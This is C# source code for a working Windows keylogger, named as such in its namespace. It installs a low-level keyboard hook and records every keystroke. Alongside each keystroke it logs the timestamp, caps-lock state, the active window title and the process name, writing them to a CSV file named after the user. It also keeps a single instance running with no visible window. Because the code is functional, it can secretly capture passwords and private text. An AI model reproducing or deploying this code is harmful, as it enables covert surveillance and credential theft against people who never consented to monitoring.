using System;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;


namespace dotnet_keylogger
{
    class keylogger
    {
        private const int WH_KEYBOARD_LL = 13; // Low Level Keyboard Hook http://www.pinvoke.net/default.aspx/Enums.HookType
        private const int WM_KEYUP = 0x0101; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keyup
        private const int WM_KEYDOWN = 0x0100; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
        private const int WM_SYSKEYDOWN = 0x0104; // Alt key idnentifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-syskeydown
        private static LowLevelKeyboardProc _hook_callback_pointer = HookCallback; // Create a pointer to the callback function https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
        private static IntPtr _hookID = IntPtr.Zero; // Mull Pointer that will be overwritten when hook registered
        private static DateTime currentTime;
        private static long lastMsgTime = 0;
        private static int lastScanCode;
        private static int lastFlags;
        private static int capslock = 0;

        private static StreamWriter sw;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            /* https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
             * Params:
             *  nCode : if greater than ZERO, return the result of CallNextHookEx
             *  wParam : WM_KEYDOWN; WM_KEYUP, WM_SYSKEYDOWN or WM_SYSKEYUP
             *  lParam : 
             */

            /* https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct
             * lParams struct:
             * DWORD vkCode = Virtual Key code https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
             * DWORD scanCode = Hardware scan code for the key
             * DWORD flags = 8 bit code describing various events
             *  bits of note:
             *   0: Is it an extended key? 
             *   1: If the key injection comes from a lower integirty process?
             *   4: Was the key injected?
             *   5: Is the ALT key down? Useless
             *   7: Transition (0 if pressed, 1 if released)
             * DWORD time = timestamp equivelant to GetMessageTime
             * ULONG_PTR dwExtraInfo = Pointer to extra info
             */
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && Marshal.ReadInt32(lParam) == (int)VirtualKeyStates.VK_CAPITAL)
            {
                capslock = 1 - capslock;
            }


            if (nCode >= 0 /*&& wParam == (IntPtr)WM_KEYUP*/)
            {
                long diff = 0;
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == 0x14)
                {


                }
                int scanCode = Marshal.ReadInt32(lParam + 4);
                int flags = Marshal.ReadInt32(lParam + 8);
                /// Skip repeat messages if a key if its being held down
                if (scanCode == lastScanCode && flags == lastFlags)
                { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
                else
                { lastScanCode = scanCode; lastFlags = flags; }
                /// 
                int timestamp = Marshal.ReadInt32(lParam + 12);
                if (currentTime.Year == 1)
                {
                    currentTime = DateTime.UtcNow;
                }
                else
                {
                    if (timestamp < lastMsgTime) {diff = (timestamp + (2147483647 - lastMsgTime)); } //long max wrap
                    else { diff = timestamp - lastMsgTime; }
                    currentTime = currentTime.AddMilliseconds(diff);
                }
                lastMsgTime = timestamp;
                string windowTitle = GetActiveWindowTitle();
                string windowName = GetActiveWindowName();
                string[] elements = {
                    currentTime.ToLongDateString(),
                    (currentTime.ToLongTimeString() + ":" + currentTime.Millisecond.ToString("D3")),
                    capslock.ToString(),
                    flags.ToString(),
                    diff.ToString("D3"),
                    ((Keys)vkCode).ToString(),
                    windowTitle,
                    windowName
                };
                string line = string.Join(",", elements);
                sw.Write(line + "\r\n");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetActiveWindowName()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            GetWindowText(handle, Buff, nChars);
            return Buff.ToString();
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            GetWindowThreadProcessId(handle, out int pID);
            return Process.GetProcessById(pID).ProcessName;
        }

        private static void TrackCapsLock()
        {
            while (true)
            {
                int temp = (int)GetKeyState(VirtualKeyStates.VK_CAPITAL);
                if (temp == -128 || temp == -127) { continue; } /// If depressed right now, skip
                capslock = temp;
                Thread.Sleep(100);
            }
        }

        public static void Main ()
            {
            string pname = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
            Process[] p = Process.GetProcessesByName(pname);
            if (p.Length > 1)
                Environment.Exit(0); /// already running, time to go bye bye
            sw = new StreamWriter(@"C:\keylog_" + pname + "--" + Environment.UserName + @".csv", true);
            sw.AutoFlush = true;
            Thread thread_capslock_track = new Thread( new ThreadStart(TrackCapsLock));
            thread_capslock_track.Start();
            _hookID = SetHook(_hook_callback_pointer);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            sw.Flush();
            sw.Close();
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        internal static extern int GetMessageTime();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        enum VirtualKeyStates : int // https://www.pinvoke.net/default.aspx/user32.getkeystate
        {
            VK_CAPITAL = 0x14,
        }
            [DllImport("user32.dll")]
        static extern short GetKeyState(VirtualKeyStates nVirtKey);
    }
}
